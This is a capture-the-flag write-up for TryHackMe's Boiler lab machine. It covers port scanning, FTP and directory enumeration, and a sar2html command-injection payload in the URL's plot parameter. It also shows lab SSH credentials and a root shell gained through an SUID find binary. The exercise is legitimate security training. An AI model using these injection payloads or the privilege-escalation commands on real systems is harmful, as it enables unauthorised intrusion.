![Screenshot 2023-10-25 155908.png](Boiler_CTF%202fd0e913c674474ca24d50d2b61f46f5/default_tryhackme.png)
![Screenshot 2023-10-25 155908.png](Boiler_CTF%202fd0e913c674474ca24d50d2b61f46f5/image.jpeg)

# Boiler_CTF

Intermediate level CTF. Just enumerate, you'll get there.

## #Scanning

```jsx
nmap -A -Pn -p- -T4 10.10.205.161 -oN nmap_result.txt
```

![Screenshot 2023-10-25 155908.png](Boiler_CTF%202fd0e913c674474ca24d50d2b61f46f5/Screenshot_2023-10-25_155908.png)

![Screenshot 2023-10-25 160112.png](Boiler_CTF%202fd0e913c674474ca24d50d2b61f46f5/Screenshot_2023-10-25_160112.png)

Here we found open port 21, 80, 10000, and 55007 which run ssh services .

## #FTP Enumeration

```jsx
ftp 10.10.205.161
```

![Screenshot 2023-10-25 160356.png](Boiler_CTF%202fd0e913c674474ca24d50d2b61f46f5/Screenshot_2023-10-25_160356.png)

![Screenshot 2023-10-25 161002.png](Boiler_CTF%202fd0e913c674474ca24d50d2b61f46f5/Screenshot_2023-10-25_161002.png)

It Seems like some kind of rotation cipher. So, I use [CyberChef](https://gchq.github.io/CyberChef/) to find out.

![Screenshot 2023-10-25 160935.png](Boiler_CTF%202fd0e913c674474ca24d50d2b61f46f5/Screenshot_2023-10-25_160935.png)

Ah! Yes. its a ROT13 and this text is decrypted to :

> *Just wanted to see if you find it. Lol. Remember: Enumeration is the key!*
> 

## #Directory Enmeration

```jsx
gobuster dir -u http://10.10.205.161/ -w /home/kali/Downloads/SecLists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -o gobuster_output.txt -t 20
```

![Screenshot 2023-10-25 161440.png](Boiler_CTF%202fd0e913c674474ca24d50d2b61f46f5/Screenshot_2023-10-25_161440.png)

```jsx
gobuster dir -u http://10.10.205.161/joomla -w /home/kali/Downloads/SecLists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -o gobuster_output.txt -t 20
```

we have found  many directories but there is a particular direction called `/_test/` which have some interesting service running.

![Screenshot 2023-10-25 164247.png](Boiler_CTF%202fd0e913c674474ca24d50d2b61f46f5/Screenshot_2023-10-25_164247.png)

**sar2html**? huh!. A quick search on google about sar2html. We found out **sar2html RCE** on [exploit-db](https://www.exploit-db.com/exploits/47204).

![Screenshot 2023-10-26 004102.png](Boiler_CTF%202fd0e913c674474ca24d50d2b61f46f5/Screenshot_2023-10-26_004102.png)

![Screenshot 2023-10-26 004139.png](Boiler_CTF%202fd0e913c674474ca24d50d2b61f46f5/Screenshot_2023-10-26_004139.png)

```jsx
http://10.10.205.161/joomla/_test/?plot=;ls
```

And it worked! We can see the **log.txt** file. Now we have to use cat to read the file.

```jsx
http://10.10.205.161/joomla/_test/?plot=;cat log.txt
```

![Screenshot 2023-10-26 001130.png](Boiler_CTF%202fd0e913c674474ca24d50d2b61f46f5/Screenshot_2023-10-26_001130.png)

And BOOM! We got the **SSH** username: **basterd** and password: **superduperp@$$**

## #Initial Foothold

```jsx
ssh basterd@10.10.205.161 -p 55007
```

![Screenshot 2023-10-26 001556.png](Boiler_CTF%202fd0e913c674474ca24d50d2b61f46f5/Screenshot_2023-10-26_001556.png)

## #Pivoting

![Screenshot 2023-10-26 001828.png](Boiler_CTF%202fd0e913c674474ca24d50d2b61f46f5/Screenshot_2023-10-26_001828.png)

```jsx
su stoner
password : superduperp@$$no1knows
```

![Screenshot 2023-10-26 002114.png](Boiler_CTF%202fd0e913c674474ca24d50d2b61f46f5/Screenshot_2023-10-26_002114.png)

## #Privilege Escalation

```jsx
find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
```

![Screenshot 2023-10-26 002434.png](Boiler_CTF%202fd0e913c674474ca24d50d2b61f46f5/Screenshot_2023-10-26_002434.png)

In the list there is **find** commnad which have SUID bit set which means we can run find as root user. Using **-exec** flag as shown above. Let’s try out by changing the permission of root directory.

```jsx
find . -exec chmod 777 /root \;
```

or we have use [`gtfobins`](https://gtfobins.github.io/gtfobins/find/#suid) websites to get the find command for root privilege.

![Screenshot 2023-10-26 003536.png](Boiler_CTF%202fd0e913c674474ca24d50d2b61f46f5/Screenshot_2023-10-26_003536.png)

```jsx
/usr/bin/find . -exec /bin/sh -p \; -quit
```

![Screenshot 2023-10-26 003637.png](Boiler_CTF%202fd0e913c674474ca24d50d2b61f46f5/Screenshot_2023-10-26_003637.png)

Now find the final flag! 

![Screenshot 2023-10-26 003820.png](Boiler_CTF%202fd0e913c674474ca24d50d2b61f46f5/Screenshot_2023-10-26_003820.png)